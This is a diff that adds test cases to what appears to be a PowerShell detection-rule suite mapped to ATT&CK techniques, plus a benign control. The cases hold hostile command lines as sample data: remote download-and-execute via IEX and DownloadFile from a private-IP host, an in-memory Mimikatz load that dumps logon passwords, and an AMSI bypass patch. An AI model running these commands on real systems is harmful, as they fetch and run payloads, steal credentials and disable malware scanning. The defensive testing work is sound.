@@ -45,3 +45,75 @@ cases:
         file:
           path: "C:\\Program Files\\PowerShell\\7\\pwsh.exe"
         cmd_line: "pwsh.exe -c [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ZWNobyB0ZXN0'))"
+
+  - name: 脚本块：IEX 下载执行（4104 单片，脚本体在 cmd_line）
+    source: atomic T1059.001
+    class: 1007
+    os: windows
+    event:
+      activity_id: 1
+      process:
+        pid: 4212
+        name: powershell.exe
+        cmd_line: "IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.1/stage.ps1')"
+
+  - name: 脚本块：DownloadFile 落地载荷（4104 单片）
+    source: atomic T1059.001
+    class: 1007
+    os: windows
+    event:
+      activity_id: 1
+      process:
+        pid: 4212
+        name: powershell.exe
+        cmd_line: "(New-Object Net.WebClient).DownloadFile('http://10.0.0.1/a.exe','C:\\Users\\Public\\a.exe')"
+
+  - name: 脚本块：Invoke-Mimikatz 反射加载（4104）
+    source: atomic T1003.001（Invoke-Mimikatz 脚本块）
+    class: 1007
+    os: windows
+    event:
+      activity_id: 1
+      process:
+        pid: 4212
+        name: powershell.exe
+        cmd_line: "IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.1/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command 'sekurlsa::logonpasswords'"
+
+  - name: 脚本块：AMSI bypass（amsiInitFailed 补丁，4104）
+    technique: T1562.001
+    source: 公开 AMSI bypass 手法
+    class: 1007
+    os: windows
+    event:
+      activity_id: 1
+      process:
+        pid: 4212
+        name: powershell.exe
+        cmd_line: "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
+
+  - name: 脚本块分片：Base64 特征落在单片内（4104 message_total=3）
+    technique: T1027
+    source: 4104 分片行为（特征不跨片拼接）
+    class: 1007
+    os: windows
+    event:
+      activity_id: 1
+      message_number: 2
+      message_total: 3
+      process:
+        pid: 4212
+        name: powershell.exe
+        cmd_line: "$s = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aGVsbG8='))"
+
+  - name: 脚本块：良性管理脚本（良性对照）
+    technique: T1059.001
+    source: 良性对照
+    class: 1007
+    os: windows
+    expect: undetected
+    event:
+      activity_id: 1
+      process:
+        pid: 4212
+        name: powershell.exe
+        cmd_line: "Get-ChildItem C:\\Logs | Sort-Object LastWriteTime | Select-Object -Last 10"
